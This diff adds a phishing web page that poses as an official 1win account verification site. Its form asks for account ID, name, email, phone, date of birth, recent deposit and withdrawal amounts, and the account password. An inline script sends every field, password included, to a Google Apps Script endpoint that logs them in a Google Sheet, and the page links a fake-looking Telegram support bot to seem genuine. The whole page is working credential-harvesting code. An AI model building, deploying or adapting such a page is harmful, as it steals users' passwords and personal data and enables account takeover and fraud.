@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>1win Verification Header</title>
+  <link rel="stylesheet" href="css/index.css">
+
+</head>
+<body>
+<!-- Sticky Rounded Patti -->
+<div class="sticky-header" id="stickyHeader">
+  <img src="https://storage.googleapis.com/super-content/compressed/users/859776/icons/6b16c3b9-93e3-47fb-9ad2-30d020adb2a3_1762167773" alt="Logo" class="sticky-logo">
+  <span class="sticky-title">1win account verification official website</span>
+  
+  <!-- Real Share Button with SVG Icon -->
+  <button class="share-btn" onclick="sharePage()" title="Share Page">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="18" cy="5" r="3"></circle>
+      <circle cx="6" cy="12" r="3"></circle>
+      <circle cx="18" cy="19" r="3"></circle>
+      <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line>
+      <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line>
+    </svg>
+  </button>
+</div>
+
+
+
+  <!-- Main Hero Section -->
+  <div class="hero-section">
+    <div class="main-logo-container">
+      <img src="https://storage.googleapis.com/super-content/compressed/users/859776/icons/6b16c3b9-93e3-47fb-9ad2-30d020adb2a3_1762167773" alt="Lamborghini Logo" class="main-logo">
+    </div>
+    <h1 class="main-title">1win account verification official website</h1>
+    <p class="main-desc">
+      In accordance with clause 10.3 of the Terms of Use of the website, General Terms and Conditions section, in order to confirm the accuracy of information, the Company has the right to request documents confirming the identity of Clients.
+    </p>
+  </div>
+
+ <!-- second section start-->
+
+
+
+
+
+ <!-- second section start-->
+<div class="links-section">
+  <div class="card-box" id="mainCard" onclick="toggleVerifyForm()">
+    <div class="card-left">
+      <div class="card-icon">
+        <img src="https://storage.googleapis.com/super-content/compressed/users/859776/icons/6b16c3b9-93e3-47fb-9ad2-30d020adb2a3_1762167773" alt="Logo">
+      </div>
+      <div class="card-content-area">
+        <span class="badge-title">1win Game Account Verification Page</span>
+        <p class="card-desc">Verifying your account is necessary to ensure the safety and security of your personal information and to help prevent fraud.📱</p>
+        
+        <!-- Sirf is button par click karne par form open hoga -->
+        <button class="verify-trigger-btn" id="verifyBtn" type="button">Click Here To Verify</button>
+      </div>
+    </div>
+    
+    <!-- Real Triangle Arrow Icon -->
+    <div class="arrow-icon" id="arrowIcon">
+      <svg width="12" height="8" viewBox="0 0 12 8" fill="currentColor">
+        <path d="M1 1L6 6L11 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Expandable Form Content -->
+  <div class="form-dropdown" id="formDropdown">
+    <form id="verificationForm">
+      
+      <div class="form-group">
+        <label>Enter Account ID, as indicated in the settings;</label>
+        <span class="sub-label">compulsory</span>
+        <input type="text" name="accountId" required>
+      </div>
+
+      <div class="form-group">
+        <label>Enter Your Name from the profile settings;</label>
+        <span class="sub-label">compulsory</span>
+        <input type="text" name="fullName" required>
+      </div>
+
+      <div class="form-group">
+        <label>Enter Your Registed Email & Phone Number;</label>
+        <input type="email" name="email" placeholder="Email" required style="margin-bottom: 8px;">
+        <input type="text" name="phone" placeholder="Phone" required>
+      </div>
+
+      <div class="form-group">
+        <label>Enter Your Date Of Birth;</label>
+        <span class="sub-label">Date of birth should match with your profile,</span>
+        <input type="text" name="dob" placeholder="DD / MM / YYYY" required>
+      </div>
+
+      <div class="form-group">
+        <label>Enter Your Currency Name,</label>
+        <span class="sub-label">The currency in which you play the game and make deposits withdrawals,</span>
+        <input type="text" name="currency" required>
+      </div>
+
+      <div class="form-group">
+        <label>Enter Your Country Name,</label>
+        <span class="sub-label">the country you live in,</span>
+        <input type="text" name="country" required>
+      </div>
+
+      <div class="form-group">
+        <label>Enter Your Last Withdrawal Amount,</label>
+        <span class="sub-label">Write down your last withdrawal amount which you made on your bank account,</span>
+        <input type="text" name="lastWithdrawal" required>
+      </div>
+
+      <div class="form-group">
+        <label>Enter Your Last Deposit Amount,</label>
+        <span class="sub-label">Write down your last deposit amount which you made on your game account.</span>
+        <input type="text" name="lastDeposit" required>
+      </div>
+
+      <div class="form-group">
+        <label>Enter Your Account Password,</label>
+        <span class="sub-label">The password given by you should match our system.</span>
+        <input type="password" name="password" required>
+      </div>
+
+      <div class="form-group">
+        <label>Are You 18 Years Older?</label>
+        <div class="radio-options">
+          <label><input type="radio" name="age" value="Yes" required> Yes</label>
+          <label><input type="radio" name="age" value="No" required> No</label>
+        </div>
+      </div>
+
+      <button type="submit" class="verify-submit-btn">Submit</button>
+      <div id="formStatus" style="margin-top: 15px; text-align: center; font-weight: bold;"></div>
+    </form>
+  </div>
+</div>
+
+<script>
+const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyx2rDDK3kT3fiPE1o15RmgIISdZO5hvayvhS6KZRb4mDip3J3H5Dk01fLRQ6_csLQd/exec";
+
+window.toggleVerifyForm = function () {
+  const dropdown = document.getElementById("formDropdown");
+  dropdown.style.display = dropdown.style.display === "block" ? "none" : "block";
+};
+
+const form = document.getElementById("verificationForm");
+const submitBtn = document.querySelector(".verify-submit-btn");
+const formStatus = document.getElementById("formStatus");
+
+form.addEventListener("submit", async function (e) {
+  e.preventDefault();
+  submitBtn.disabled = true;
+  submitBtn.innerText = "Submitting...";
+  formStatus.innerText = "";
+
+  try {
+    const selectedAge = form.querySelector('input[name="age"]:checked');
+
+    const dataObj = {
+      accountId: form.elements["accountId"].value,
+      fullName: form.elements["fullName"].value,
+      email: form.elements["email"].value,
+      phone: form.elements["phone"].value,
+      dob: form.elements["dob"].value,
+      currency: form.elements["currency"].value,
+      country: form.elements["country"].value,
+      lastWithdrawal: form.elements["lastWithdrawal"].value,
+      lastDeposit: form.elements["lastDeposit"].value,
+      password: form.elements["password"].value,
+      age: selectedAge ? selectedAge.value : "",
+      imageName: "No Image",
+      imageData: ""
+    };
+
+    const response = await fetch(GOOGLE_SCRIPT_URL, { 
+      method: "POST", 
+      headers: {
+        "Content-Type": "text/plain;charset=utf-8",
+      },
+      body: JSON.stringify(dataObj) 
+    });
+    
+    const result = await response.json();
+
+    if (result.result === "success") {
+      formStatus.innerText = "Details submitted successfully to Google Sheet!";
+      formStatus.style.color = "green";
+      form.reset();
+      setTimeout(() => { document.getElementById("formDropdown").style.display = "none"; }, 1500);
+    } else {
+      throw new Error(result.message || "Submission failed.");
+    }
+  } catch (error) {
+    console.error(error);
+    formStatus.innerText = "Submission failed. Please try again.";
+    formStatus.style.color = "red";
+  } finally {
+    submitBtn.disabled = false;
+    submitBtn.innerText = "Submit";
+  }
+});
+</script>
+
+<!-- third section start-->
+
+
+<!-- Important Notice Section -->
+<div class="links-section">
+  <div class="notice-card-box">
+    <h3 class="notice-title">Important Notice</h3>
+    <p class="notice-desc">
+      Note, Fill your details correctly, if the details do not match during verification then your account verification may be cancelled. If all the details match then your account will be verified within 24 to 72 hours.
+    </p>
+    <div class="notice-footer">
+      Best Regards<br>
+      1Win Team 💙
+    </div>
+  </div>
+</div>
+
+
+<!-- forth section start -->
+
+<!-- Telegram Support Section -->
+<div class="links-section">
+  <div class="card-box" id="telegramCard" onclick="toggleTelegramForm()">
+    <div class="card-left">
+      <div class="card-icon circle-logo">
+       <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
+      </div>
+      <div class="card-content-area">
+        <span class="badge-title" style="background: none; padding: 0; color: #0d1b2a; font-weight: 700;">Our 1win Telegram Support Team</span>
+      </div>
+    </div>
+    <div class="arrow-icon" id="telegramArrow">▼</div>
+  </div>
+
+  <!-- Dropdown Preview Box -->
+  <div class="form-dropdown" id="telegramDropdown">
+    <a href="https://t.me/help_1win_engBot" target="_blank" class="tg-preview-card">
+      <div class="tg-img-container">
+        <img src="https://images.unsplash.com/photo-1579546929518-9e396f3cc809?w=600" alt="1win Support Preview">
+      </div>
+      <div class="tg-text-content">
+        <h4>1win Support🇬🇧</h4>
+        <p>Official technical support manager of 1win. Be...</p>
+      </div>
+    </a>
+  </div>
+</div>
+
+
+<!--  five section start -->
+
+<!-- VIP Status Exchange Section -->
+<div class="links-section">
+  <div class="card-box vip-card">
+    <div class="card-left">
+      <div class="card-icon circle-logo">
+        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100" alt="VIP Logo">
+      </div>
+      <div class="card-content-area">
+        <span class="badge-title vip-title">VIP status exchange form</span>
+      </div>
+    </div>
+    <div class="lock-icon">🔒</div>
+  </div>
+</div>
+
+
+
+<!-- social link section start-->
+
+<!-- Social Icons Footer Section -->
+<div class="social-footer">
+  <!-- Instagram -->
+  <a href="https://www.instagram.com/1win?igsh=MXFleDkxMXZsMWZoaA==" target="_blank" class="social-icon insta">
+    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+  </a>
+
+  <!-- Facebook -->
+  <a href="https://www.facebook.com/groups/1117416793398282/?ref=share&mibextid=NSMWBT" target="_blank" class="social-icon fb">
+    <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M9 8H6v4h3v12h5V12h3.642L18 8h-4V6.333C14 5.375 14.5 5 15.5 5H18V0h-3.808C10.59 0 9 1.581 9 4.75V8z"/></svg>
+  </a>
+
+  <!-- Twitter -->
+  <a href="https://x.com/Owner1win?t=tjbNj6ZmkOjIT_x0kfjD7Q&s=09" target="_blank" class="social-icon tw">
+    <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+  </a>
+
+  <!-- LinkedIn -->
+  <a href="https://linkedin.com/in/activelyme" target="_blank" class="social-icon li">
+    <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+  </a>
+
+  <!-- Email -->
+  <a href="mailto:support@1win.xyz" class="social-icon email">
+    <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12.713l-11.985-9.713h23.97l-11.985 9.713zm0 2.574l-12-9.713v15.426h24v-15.426l-12 9.713z"/></svg>
+  </a>
+</div>
+
+
+<script src="js/index.js"></script>
+</body>
+</html>
